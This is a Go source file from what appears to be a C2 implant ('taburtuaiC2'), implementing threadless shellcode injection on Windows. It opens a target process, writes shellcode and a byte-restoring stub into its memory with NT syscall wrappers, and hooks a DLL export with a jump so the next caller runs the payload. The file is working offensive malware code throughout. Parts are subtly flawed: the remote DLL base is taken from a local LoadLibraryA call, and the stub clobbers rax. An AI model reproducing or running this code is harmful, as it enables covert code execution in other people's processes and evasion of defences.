//go:build windows

package inject

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// hgExportDir mirrors IMAGE_EXPORT_DIRECTORY for remote PE parsing.
type hgExportDir struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// ThreadlessInject injects shellcode into pid by hooking exportName in dllName.
// The first caller of that export in the remote process executes the shellcode.
func ThreadlessInject(pid uint32, dllName, exportName string, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("threadless: empty shellcode")
	}

	hProc, err := windows.OpenProcess(winsyscall.ProcessAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	exportRVA, dllBase, err := remoteExportRVA(hProc, dllName, exportName)
	if err != nil {
		return fmt.Errorf("resolve %s!%s: %w", dllName, exportName, err)
	}
	hookAddr := dllBase + uintptr(exportRVA)

	var origBytes [5]byte
	if err := readRemoteBytes(hProc, hookAddr, origBytes[:]); err != nil {
		return fmt.Errorf("read original bytes: %w", err)
	}

	payload, _ := buildThreadlessPayload(shellcode, origBytes, hookAddr)

	remoteMem, err := winsyscall.NtAlloc(hProc, uintptr(len(payload)), winsyscall.PageReadWrite)
	if err != nil {
		return err
	}

	if err := winsyscall.NtWrite(hProc, remoteMem, payload); err != nil {
		winsyscall.NtFree(hProc, remoteMem)
		return fmt.Errorf("payload write: %w", err)
	}

	if _, err := winsyscall.NtProtect(hProc, remoteMem, uintptr(len(payload)), winsyscall.PageExecRead); err != nil {
		winsyscall.NtFree(hProc, remoteMem)
		return fmt.Errorf("VirtualProtect(RX): %w", err)
	}

	jmpOffset := int32(int64(remoteMem) - int64(hookAddr+5))
	jmpPatch := [5]byte{0xE9,
		byte(jmpOffset), byte(jmpOffset >> 8),
		byte(jmpOffset >> 16), byte(jmpOffset >> 24)}

	oldProtect, _ := winsyscall.NtProtect(hProc, hookAddr, 5, winsyscall.PageReadWrite)
	if err := writeRemoteBytes(hProc, hookAddr, jmpPatch[:]); err != nil {
		winsyscall.NtProtect(hProc, hookAddr, 5, oldProtect) //nolint:errcheck
		winsyscall.NtFree(hProc, remoteMem)
		return fmt.Errorf("hook write: %w", err)
	}
	winsyscall.NtProtect(hProc, hookAddr, 5, oldProtect) //nolint:errcheck

	return nil
}

// buildThreadlessPayload creates: shellcode + resume stub that restores the original bytes.
func buildThreadlessPayload(shellcode []byte, orig [5]byte, hookAddr uintptr) ([]byte, []byte) {
	stub := []byte{
		0x50,                                           // push rax
		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,            // mov rax, imm64 (hookAddr)
		0xC7, 0x00, 0, 0, 0, 0,                         // mov dword [rax], orig[0:4]
		0xC6, 0x40, 0x04, 0,                            // mov byte [rax+4], orig[4]
		0x58,                                           // pop rax
		0xFF, 0xE0,                                     // jmp rax
	}

	for i := 0; i < 8; i++ {
		stub[3+i] = byte(hookAddr >> (uint(i) * 8))
	}
	stub[12] = orig[0]
	stub[13] = orig[1]
	stub[14] = orig[2]
	stub[15] = orig[3]
	stub[19] = orig[4]

	payload := make([]byte, len(shellcode)+len(stub))
	copy(payload, shellcode)
	copy(payload[len(shellcode):], stub)
	return payload, stub
}

func remoteExportRVA(hProc windows.Handle, dllName, exportName string) (uint32, uintptr, error) {
	dllBase, err := remoteModuleBase(hProc, dllName)
	if err != nil {
		return 0, 0, err
	}

	var mz [2]byte
	readRemoteBytes(hProc, dllBase, mz[:]) //nolint:errcheck
	if mz[0] != 0x4D || mz[1] != 0x5A {
		return 0, 0, fmt.Errorf("invalid MZ at remote DLL base 0x%X", dllBase)
	}
	var peOff uint32
	readRemoteT(hProc, dllBase+0x3C, &peOff)

	var exportDirRVA uint32
	readRemoteT(hProc, dllBase+uintptr(peOff)+0x88, &exportDirRVA)
	if exportDirRVA == 0 {
		return 0, 0, fmt.Errorf("no export directory in %s", dllName)
	}

	var exp hgExportDir
	readRemoteT(hProc, dllBase+uintptr(exportDirRVA), &exp)

	for i := uint32(0); i < exp.NumberOfNames; i++ {
		var nameRVA uint32
		readRemoteT(hProc, dllBase+uintptr(exp.AddressOfNames)+uintptr(i)*4, &nameRVA)
		name := remoteReadCString(hProc, dllBase+uintptr(nameRVA), 128)
		if name != exportName {
			continue
		}
		var ord uint16
		readRemoteT(hProc, dllBase+uintptr(exp.AddressOfNameOrdinals)+uintptr(i)*2, &ord)
		var fnRVA uint32
		readRemoteT(hProc, dllBase+uintptr(exp.AddressOfFunctions)+uintptr(ord)*4, &fnRVA)
		return fnRVA, dllBase, nil
	}
	return 0, 0, fmt.Errorf("%s not found in %s export table", exportName, dllName)
}

func remoteModuleBase(hProc windows.Handle, dllName string) (uintptr, error) {
	hMod, _, err := winsyscall.ProcLoadLibraryA.Call(
		uintptr(unsafe.Pointer(&[]byte(dllName + "\x00")[0])),
	)
	if hMod == 0 {
		return 0, fmt.Errorf("LoadLibraryA(%s): %v", dllName, err)
	}
	return hMod, nil
}

func readRemoteBytes(hProc windows.Handle, addr uintptr, buf []byte) error {
	var read uintptr
	return windows.ReadProcessMemory(hProc, addr, &buf[0], uintptr(len(buf)), &read)
}

func writeRemoteBytes(hProc windows.Handle, addr uintptr, buf []byte) error {
	var written uintptr
	return windows.WriteProcessMemory(hProc, addr, &buf[0], uintptr(len(buf)), &written)
}

func readRemoteT[T any](hProc windows.Handle, addr uintptr, out *T) {
	sz := unsafe.Sizeof(*out)
	buf := make([]byte, sz)
	readRemoteBytes(hProc, addr, buf) //nolint:errcheck
	*out = *(*T)(unsafe.Pointer(&buf[0]))
}

func remoteReadCString(hProc windows.Handle, addr uintptr, maxLen int) string {
	buf := make([]byte, maxLen)
	readRemoteBytes(hProc, addr, buf) //nolint:errcheck
	for i, b := range buf {
		if b == 0 {
			return string(buf[:i])
		}
	}
	return string(buf)
}
